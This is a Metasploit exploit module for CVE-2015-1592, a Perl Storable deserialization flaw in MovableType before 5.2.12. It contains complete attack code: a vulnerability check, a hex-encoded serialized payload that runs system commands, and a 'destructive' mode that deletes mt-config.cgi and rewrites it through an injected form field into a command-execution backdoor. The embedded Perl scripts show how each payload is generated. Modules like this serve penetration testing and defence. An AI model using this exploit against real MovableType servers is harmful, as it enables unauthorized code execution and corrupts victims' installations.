# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = GoodRanking
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;SixApart MovableType Storable Perl Code Execution&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a serialization flaw in MovableType before 5.2.12 to execute
          arbitrary code. The default nondestructive mode depends on the target server having
          the Object::MultiType and DateTime Perl modules installed in Perl&#039;s @INC paths.
          The destructive mode of operation uses only required MovableType dependencies,
          but it will noticeably corrupt the MovableType installation.
      },
      &#039;Author&#039;         =>
        [
          &#039;John Lightsey&#039;,
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2015-1592&#039; ],
          [ &#039;URL&#039;, &#039;https://movabletype.org/news/2015/02/movable_type_607_and_5212_released_to_close_security_vulnera.html&#039; ],
        ],
      &#039;Privileged&#039;     => false, # web server context
      &#039;Payload&#039;        =>
        {
          &#039;DisableNops&#039; => true,
          &#039;BadChars&#039;    => &#039; &#039;,
          &#039;Space&#039;       => 1024,
        },
      &#039;Compat&#039;         =>
        {
          &#039;PayloadType&#039; => &#039;cmd&#039;
        },
      &#039;Platform&#039;       => [&#039;unix&#039;],
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Targets&#039;        => [[&#039;Automatic&#039;, {}]],
      &#039;DisclosureDate&#039; => &#039;Feb 11 2015&#039;,
      &#039;DefaultTarget&#039;  => 0))
 
    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;MoveableType cgi-bin directory path&#039;, &#039;/cgi-bin/mt/&#039;]),
        OptBool.new(&#039;DESTRUCTIVE&#039;, [true, &#039;Use destructive attack method (more likely to succeed, but corrupts target system.)&#039;, false])
      ], self.class
    )
 
  end
 
=begin
 
#!/usr/bin/perl
 
# generate config parameters for injection checks
 
use Storable;
 
{
 
    package XXXCHECKXXX;
 
    sub STORABLE_thaw {
        return 1;
    }
 
    sub STORABLE_freeze {
        return 1;
    }
 
}
 
my $check_obj = bless { ignore => &#039;this&#039; }, XXXCHECKXXX;
my $frozen = &#039;SERG&#039; . pack( &#039;N&#039;, 0 ) . pack( &#039;N&#039;, 3 ) . Storable::freeze({ x => $check_obj});
$frozen = unpack &#039;H*&#039;, $frozen;
print "LFI test for storable flaw is: $frozen\n";
 
{
    package DateTime;
    use overload &#039;+&#039; => sub { &#039;ignored&#039; };
}
 
=end
 
  def check
    vprint_status("#{peer} - Sending storable test injection for XXXCHECKXXX.pm load failure")
    res = send_request_cgi({
        &#039;method&#039;    => &#039;GET&#039;,
        &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;mt-wizard.cgi&#039;),
        &#039;vars_get&#039; => {
          &#039;__mode&#039; => &#039;retry&#039;,
          &#039;step&#039;   => &#039;configure&#039;,
          &#039;config&#039; => &#039;53455247000000000000000304080831323334353637380408080803010000000413020b585858434845434b58585801310100000078&#039;
        }
      })
 
    unless res && res.code == 200 && res.body.include?("Can&#039;t locate XXXCHECKXXX.pm")
      vprint_status("#{peer} - Failed XXXCHECKXXX.pm load test");
      return Exploit::CheckCode::Safe
    end
    Exploit::CheckCode::Vulnerable
  end
 
  def exploit
    if datastore[&#039;DESTRUCTIVE&#039;] == true
      exploit_destructive
    else
      exploit_nondestructive
    end
  end
 
=begin
 
#!/usr/bin/perl
 
# Generate nondestructive config parameter for RCE via Object::MultiType
# and Try::Tiny. The generated value requires minor modification to insert
# the payload inside the system() call and resize the padding.
 
use Storable;
 
{
    package Object::MultiType;
    use overload &#039;+&#039; => sub { &#039;ingored&#039; };
}
 
{
    package Object::MultiType::Saver;
}
 
{
    package DateTime;
    use overload &#039;+&#039; => sub { &#039;ingored&#039; };
}
 
{
    package Try::Tiny::ScopeGuard;
}
 
my $try_tiny_loader = bless {}, &#039;DateTime&#039;;
my $multitype_saver = bless { c => &#039;MT::run_app&#039; }, &#039;Object::MultiType::Saver&#039;;
my $multitype_coderef = bless \$multitype_saver, &#039;Object::MultiType&#039;;
my $try_tiny_executor = bless [$multitype_coderef, &#039;MT;print qq{Content-type: text/plain\n\n};system(q{});&#039; . (&#039;#&#039; x 1025) . "\nexit;"], &#039;Try::Tiny::ScopeGuard&#039;;
 
my $data = [$try_tiny_loader, $try_tiny_executor];
my $frozen = &#039;SERG&#039; . pack( &#039;N&#039;, 0 ) . pack( &#039;N&#039;, 3 ) . Storable::freeze($data);
$frozen = unpack &#039;H*&#039;, $frozen;
print "RCE payload requiring Object::MultiType and DateTime: $frozen\n";
 
=end
 
  def exploit_nondestructive
    print_status("#{peer} - Using nondestructive attack method")
    config_payload = "53455247000000000000000304080831323334353637380408080802020000001411084461746554696d6503000000000411155472793a3a54696e793a3a53636f7065477561726402020000001411114f626a6563743a3a4d756c7469547970650411184f626a6563743a3a4d756c7469547970653a3a536176657203010000000a0b4d543a3a72756e5f6170700100000063013d0400004d543b7072696e742071717b436f6e74656e742d747970653a20746578742f706c61696e5c6e5c6e7d3b73797374656d28717b"
    config_payload <<  payload.encoded.unpack(&#039;H*&#039;)[0]
    config_payload << "7d293b"
    config_payload << "23" * (1025 - payload.encoded.length)
    config_payload << "0a657869743b"
 
    print_status("#{peer} - Sending payload (#{payload.raw.length} bytes)")
 
    send_request_cgi({
      &#039;method&#039;    => &#039;GET&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;mt-wizard.cgi&#039;),
      &#039;vars_get&#039; => {
        &#039;__mode&#039; => &#039;retry&#039;,
        &#039;step&#039;   => &#039;configure&#039;,
        &#039;config&#039; => config_payload
      }
    }, 5)
  end
 
=begin
 
#!/usr/bin/perl
 
# Generate destructive config parameter to unlink mt-config.cgi
 
use Storable;
 
{
    package CGITempFile;
}
 
my $unlink_target = "mt-config.cgi";
my $cgitempfile = bless \$unlink_target, "CGITempFile";
 
my $data = [$cgitempfile];
my $frozen = &#039;SERG&#039; . pack( &#039;N&#039;, 0 ) . pack( &#039;N&#039;, 3 ) . Storable::freeze($data);
$frozen = unpack &#039;H*&#039;, $frozen;
print "RCE unlink payload requiring CGI: $frozen\n";
 
=end
 
  def exploit_destructive
    print_status("#{peer} - Using destructive attack method")
    # First we need to delete mt-config.cgi using the storable injection
 
    print_status("#{peer} - Sending storable injection to unlink mt-config.cgi")
 
    res = send_request_cgi({
      &#039;method&#039;    => &#039;GET&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;mt-wizard.cgi&#039;),
      &#039;vars_get&#039; => {
        &#039;__mode&#039; => &#039;retry&#039;,
        &#039;step&#039;   => &#039;configure&#039;,
        &#039;config&#039; => &#039;534552470000000000000003040808313233343536373804080808020100000004110b43474954656d7046696c650a0d6d742d636f6e6669672e636769&#039;
      }
    })
 
    if res && res.code == 200
      print_status("Successfully sent unlink request")
    else
      fail_with(Failure::Unknown, "Error sending unlink request")
    end
 
    # Now we rewrite mt-config.cgi to accept a payload
 
    print_status("#{peer} - Rewriting mt-config.cgi to accept the payload")
 
    res = send_request_cgi({
      &#039;method&#039;    => &#039;GET&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;mt-wizard.cgi&#039;),
      &#039;vars_get&#039;  => {
        &#039;__mode&#039;             => &#039;next_step&#039;,
        &#039;step&#039;               => &#039;optional&#039;,
        &#039;default_language&#039;   => &#039;en_us&#039;,
        &#039;email_address_main&#039; => "x\nObjectDriver mysql;use CGI;print qq{Content-type: text/plain\\n\\n};if(my $c = CGI->new()->param(&#039;xyzzy&#039;)){system($c);};unlink(&#039;mt-config.cgi&#039;);exit;1",
        &#039;set_static_uri_to&#039;  => &#039;/&#039;,
        &#039;config&#039;             => &#039;5345524700000000000000024800000001000000127365745f7374617469635f66696c655f746f2d000000012f&#039;, # equivalent to &#039;set_static_file_to&#039; => &#039;/&#039;,
      }
    })
 
    if res && res.code == 200
      print_status("Successfully sent mt-config rewrite request")
    else
      fail_with(Failure::Unknown, "Error sending mt-config rewrite request")
    end
 
    # Finally send the payload
 
    print_status("#{peer} - Sending payload request")
 
    send_request_cgi({
      &#039;method&#039;    => &#039;GET&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;mt.cgi&#039;),
      &#039;vars_get&#039;  => {
        &#039;xyzzy&#039;   => payload.encoded,
      }
    }, 5)
  end
 
end

